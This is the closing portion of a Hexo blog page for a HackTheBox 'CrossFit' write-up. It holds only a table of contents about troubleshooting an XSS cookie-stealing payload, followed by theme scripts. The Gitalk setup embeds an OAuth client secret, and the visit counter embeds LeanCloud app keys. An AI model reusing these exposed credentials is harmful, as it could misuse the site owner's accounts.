class="toc-text">遇到的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81HTTP%E6%9C%8D%E5%8A%A1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%A5%E8%8E%B7%E5%8F%96payload2-js%EF%BC%8C%E4%BD%86nc%E5%B0%B1%E6%98%AF%E6%8E%A5%E6%94%B6%E4%B8%8D%E5%88%B0%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%B8%80%E6%8E%A5%E6%94%B6%E7%AB%8B%E5%88%BB%E6%96%AD%E5%BC%80"><span class="toc-text">1、HTTP服务可以看到管理员来获取payload2.js，但nc就是接收不到数据，一接收立刻断开</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81xhr%E5%90%8C%E4%BC%9A%E8%AF%9D%E9%97%AE%E9%A2%98"><span class="toc-text">2、xhr同会话问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81PHP%E6%8C%87%E5%AE%9A%E5%BD%A2%E6%95%B0%EF%BC%8C%E4%BC%A0%E5%85%A5%E7%9A%84%E4%B8%8D%E6%98%AF%E6%8C%87%E5%AE%9A%E7%9A%84%E5%BD%A2%E5%8F%82"><span class="toc-text">3、PHP指定形数，传入的不是指定的形参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%A5%BD%E5%83%8F%E6%B2%A1%E8%AE%BE%E7%BD%AEhttponly-%E4%BD%86%E4%B8%BA%E5%95%A5%E6%8A%93%E4%B8%8D%E5%88%B0cookie"><span class="toc-text">4、好像没设置httponly 但为啥抓不到cookie</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="HackTheBox | CrossFit (未完待续)";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2022 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tarimoe.github.io","owner":"tarimoe","admin":["tarimoe"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
